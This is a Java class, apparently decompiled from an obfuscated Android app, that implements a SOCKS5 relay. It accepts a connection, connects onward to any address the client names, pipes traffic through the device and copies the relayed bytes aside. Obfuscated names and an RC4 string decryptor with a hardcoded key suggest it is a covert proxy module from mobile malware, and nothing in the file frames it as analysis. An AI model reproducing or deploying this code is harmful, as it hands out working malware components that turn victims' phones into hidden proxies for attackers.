package com.example.mmm.API;

import com.example.mmm.*;
import com.example.mmm.Utils.*;
import java.net.*;
import android.util.*;
import com.example.mmm.unmapped.*;
import java.io.*;

public final class SocksThread implements Runnable
{
    constants central$;
    utils house$;
    private Socket opposite$;
    private int villages$;
    
    public SocksThread(final Socket opposite$) {
        super();
        this.central$ = new constants();
        this.house$ = new utils();
        this.villages$ = 102400;
        this.opposite$ = opposite$;
    }
    
    private String _french(String s) {
        s = new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode(s, 0), "UTF-8"))));
        return s;
    }
    
    @Override
    public final void run() {
        final InputStream \u0131nputStream = this.opposite$.getInputStream();
        final OutputStream outputStream = this.opposite$.getOutputStream();
        final byte[] array = new byte[this.villages$];
        \u0131nputStream.read(array, 0, 3);
        outputStream.write(new byte[] { 5, 0 });
        outputStream.flush();
        \u0131nputStream.read(array, 0, 10);
        final StringBuilder sb = new StringBuilder();
        sb.append(array[4] & 0xFF);
        sb.append(".");
        sb.append(array[5] & 0xFF);
        sb.append(".");
        sb.append(array[6] & 0xFF);
        sb.append(".");
        sb.append(array[7] & 0xFF);
        final Socket socket = new Socket(sb.toString(), (array[8] & 0xFF) * 256 + (array[9] & 0xFF));
        final InputStream \u0131nputStream2 = socket.getInputStream();
        final OutputStream outputStream2 = socket.getOutputStream();
        final byte[] address = socket.getLocalAddress().getAddress();
        final int localPort = socket.getLocalPort();
        outputStream.write(new byte[] { 5, 0, 0, 1, address[0], address[1], address[2], address[3], (byte)(localPort >> 8), (byte)(localPort & 0xFF) }, 0, 10);
        outputStream.flush();
        new Hollyanne(\u0131nputStream2, outputStream).start();
        final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        while (true) {
            final int read = \u0131nputStream.read(array, 0, this.villages$);
            if (read <= 0) {
                break;
            }
            outputStream2.write(array, 0, read);
            byteArrayOutputStream.write(array, 0, read);
            outputStream2.flush();
        }
        if (this.opposite$ != null) {
            this.opposite$.close();
        }
    }
}
